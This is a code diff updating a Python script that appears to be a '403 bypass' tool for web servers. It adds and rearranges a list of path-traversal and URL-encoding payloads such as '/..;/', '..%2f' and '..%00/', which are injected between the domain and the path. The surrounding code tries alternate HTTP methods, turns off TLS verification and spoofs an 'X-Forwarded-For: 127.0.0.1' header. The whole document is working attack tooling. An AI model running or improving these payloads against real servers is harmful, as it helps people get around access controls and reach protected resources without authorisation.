@@ -6,12 +6,12 @@ from colorama import Fore, Style
 import urllib3
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-print("""
+print(Style.BRIGHT + Fore.BLUE + """
   _  _    ___ _____ _                                         
  | || |  / _ \___ /| |__  _   _ _ __   __ _ ___ ___  ___ _ __ 
  | || |_| | | ||_ \| '_ \| | | | '_ \ / _` / __/ __|/ _ \ '__|
- |__   _| |_| |__) | |_) | |_| | |_) | (_| \__ \__ \  __/ |   
-    |_|  \___/____/|_.__/ \__, | .__/ \__,_|___/___/\___|_|   
+ |__   _| |_| |__) | |_) | |_| | |_) | (_| \__ \__ \  __/ |
+    |_|  \___/____/|_.__/ \__, | .__/ \__,_|___/___/\___|_|
                           |___/|_|\n\n""")
 
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
@@ -31,18 +31,18 @@ res5 = requests.delete(url, allow_redirects=False, verify=False, timeout=5)
 print(Style.BRIGHT + Fore.GREEN +"using DELETE :"+ "\t" + Fore.YELLOW+str(res5.status_code))
 res6 = requests.patch(url, allow_redirects=False, verify=False, timeout=5)
 print(Style.BRIGHT + Fore.GREEN + "using PATCH :" + "\t" + Fore.YELLOW + str(res6.status_code))
-print(Style.BRIGHT + Fore.RED + "Using payloads at end of URL " + "\n")
-payloads = ["/","/*","/%2f/","/./","./.","/*/","?","??","&","#","%","%20","%09","/..;/","../","..%2f","..;/",".././","..%00/","..%0d","..%5c","..%ff/","%2e%2e%2f",".%2e/","%3f","%26","%23",".json"]
+print(Style.BRIGHT + Fore.RED + "\nUsing payloads at end of URL \n")
+payloads = ["/","/*","*","/%2f/","/%2f","/./","/.","./.","/*/","?","/?","??","/??","&","/&","#","/#","%","/%","%20","/%20","%09","/%09","/..;/","/..;","/..","../","..%2f","/..%2f","..;/",".././","/.././","..%00/","..%0d","/..%0d","..%5c","/..%5c","..%ff/","%2e%2e%2f",".%2e/","/%2e","%2e","%3f","/%3f","%26","/%26","%23","/%23",".json","/*.json","/.json"]
 
 for payload in payloads:
     try:
-        url2 = url + payload
+        url2 = domain + payload + path
         res7 = requests.get(url2, allow_redirects=False , verify=False, timeout=5)
-        print(Style.BRIGHT + Fore.GREEN + url2 + " : "+ Fore.YELLOW + str(res7.status_code))
+        print(Style.BRIGHT + Fore.GREEN + url2 + " : " + Fore.YELLOW + str(res7.status_code))
     except:
         pass
 
-print(Style.BRIGHT + Fore.RED + "Using different headers " + "\n")		
+print(Style.BRIGHT + Fore.RED + "\nUsing different headers \n")		
 res8 = requests.get(url, headers={'X-Forwarded-For':'127.0.0.1'}, allow_redirects=False, verify=False)		
 print(Style.BRIGHT + Fore.GREEN + "X-Forwarded-For" + " : "+ Fore.YELLOW + str(res8.status_code))
 
